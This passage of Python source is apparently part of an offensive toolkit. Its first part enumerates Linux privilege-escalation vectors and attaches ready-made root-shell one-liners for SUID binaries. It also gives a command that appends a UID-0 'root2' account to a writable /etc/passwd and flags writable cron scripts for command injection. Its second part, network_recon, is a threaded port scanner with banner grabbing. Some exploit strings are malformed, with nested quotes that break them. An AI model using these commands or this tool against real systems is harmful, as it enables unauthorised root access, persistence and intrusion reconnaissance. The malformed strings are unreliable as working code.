    gtfobins_suid = {
        'bash': 'bash -p',
        'python': 'python -c "import os; os.setuid(0); os.system("/bin/bash")"',
        'python3': 'python3 -c "import os; os.setuid(0); os.system("/bin/bash")"',
        'perl': 'perl -e "exec \"/bin/bash\";"',
        'find': 'find . -exec /bin/bash -p \\;',
        'vim': 'vim -c ":!bash"',
        'nmap': 'nmap --interactive then !sh',
        'less': 'less /etc/passwd then !bash',
        'more': 'more /etc/passwd then !bash',
        'cp': 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash',
        'env': 'env /bin/bash -p',
        'awk': 'awk "BEGIN {system(\"/bin/bash -p\")}"',
        'node': 'node -e "require(\"child_process\").spawn(\"/bin/bash\",[\"-p\"],{stdio:[0,1,2]})"',
    }

    for dirpath, _, filenames in os.walk(os.path.join(root_path, 'usr')):
        for fn in filenames:
            fp = os.path.join(dirpath, fn)
            try:
                st = os.stat(fp)
                if st.st_mode & stat.S_ISUID:
                    basename = os.path.basename(fp)
                    if basename in gtfobins_suid:
                        findings.append({
                            'type': 'suid_exploit',
                            'path': fp,
                            'severity': 'critical',
                            'exploit': gtfobins_suid[basename],
                            'detail': f'SUID binary {basename} can be used for privilege escalation',
                        })
            except (OSError, PermissionError):
                pass

    # 2. World-writable files in PATH
    path_dirs = os.environ.get('PATH', '').split(':')
    for d in path_dirs:
        if os.path.isdir(d):
            try:
                st = os.stat(d)
                if st.st_mode & stat.S_IWOTH:
                    findings.append({
                        'type': 'writable_path_dir',
                        'path': d,
                        'severity': 'critical',
                        'detail': 'World-writable directory in PATH - can plant malicious binaries',
                    })
            except OSError:
                pass

    # 3. Sudo misconfigurations
    try:
        sudo_l = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=5)
        if 'NOPASSWD' in sudo_l.stdout:
            for line in sudo_l.stdout.split('\n'):
                if 'NOPASSWD' in line:
                    findings.append({
                        'type': 'sudo_nopasswd',
                        'severity': 'high',
                        'detail': f'NOPASSWD sudo: {line.strip()}',
                    })
        if '(ALL)' in sudo_l.stdout or '(root)' in sudo_l.stdout:
            findings.append({
                'type': 'sudo_all',
                'severity': 'critical',
                'detail': 'User can sudo as ALL/root',
            })
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    # 4. Writable /etc/passwd
    passwd = os.path.join(root_path, 'etc/passwd')
    if os.path.exists(passwd) and os.access(passwd, os.W_OK):
        findings.append({
            'type': 'writable_passwd',
            'severity': 'critical',
            'detail': '/etc/passwd is writable - can add root user',
            'exploit': 'echo "root2:$(openssl passwd -1 pass123):0:0::/root:/bin/bash" >> /etc/passwd',
        })

    # 5. Cron jobs with writable scripts
    cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/var/spool/cron']
    for cron_dir in cron_dirs:
        full = os.path.join(root_path, cron_dir.lstrip('/'))
        if os.path.isdir(full):
            for fn in os.listdir(full):
                fp = os.path.join(full, fn)
                if os.path.isfile(fp) and os.access(fp, os.W_OK):
                    findings.append({
                        'type': 'writable_cron',
                        'path': fp,
                        'severity': 'critical',
                        'detail': f'Writable cron job - inject commands for root execution',
                    })

    return {
        'vectors_found': len(findings),
        'critical': sum(1 for f in findings if f['severity'] == 'critical'),
        'findings': sorted(findings, key=lambda f: {'critical': 0, 'high': 1, 'medium': 2}[f['severity']]),
    }

def network_recon(target_range: str, port_range: str = '1-1024', timeout: float = 1.0) -> dict:
    """Perform network reconnaissance on a target range."""
    import socket
    import ipaddress
    import concurrent.futures
    from datetime import datetime

    results = {
        'target': target_range,
        'scan_start': datetime.utcnow().isoformat(),
        'hosts': [],
    }

    # Parse port range
    ports = []
    for part in port_range.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))

    # Common service signatures
    service_banners = {
        21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
        80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 445: 'smb',
        993: 'imaps', 995: 'pop3s', 1433: 'mssql', 3306: 'mysql',
        3389: 'rdp', 5432: 'postgresql', 5900: 'vnc', 6379: 'redis',
        8080: 'http-proxy', 8443: 'https-alt', 27017: 'mongodb',
    }

    def scan_port(ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                banner = ''
                try:
                    sock.send(b'\r\n')
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()[:200]
                except (socket.timeout, OSError):
                    pass
                service = service_banners.get(port, 'unknown')
                return {'port': port, 'state': 'open', 'service': service, 'banner': banner}
            sock.close()
        except (socket.timeout, OSError):
            pass
        return None

    def scan_host(ip):
        # Quick ping check via TCP connect to common ports
        alive = False
        for check_port in [80, 443, 22, 445]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((str(ip), check_port)) == 0:
                    alive = True
                s.close()
                if alive:
                    break
            except OSError:
                pass

        if not alive:
            return None

        host_info = {
            'ip': str(ip),
            'hostname': '',
            'open_ports': [],
        }

        try:
            host_info['hostname'] = socket.getfqdn(str(ip))
        except socket.herror:
            pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(scan_port, ip, p): p for p in ports}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    host_info['open_ports'].append(result)

        host_info['open_ports'].sort(key=lambda x: x['port'])
        return host_info

    # Parse target range
    try:
        network = ipaddress.ip_network(target_range, strict=False)
        targets = list(network.hosts())[:256]  # limit to /24
    except ValueError:
        targets = [ipaddress.ip_address(target_range)]

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(scan_host, ip): ip for ip in targets}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result and result['open_ports']:
                results['hosts'].append(result)

    results['scan_end'] = datetime.utcnow().isoformat()
    results['hosts_found'] = len(results['hosts'])
    results['total_open_ports'] = sum(len(h['open_ports']) for h in results['hosts'])

    return results

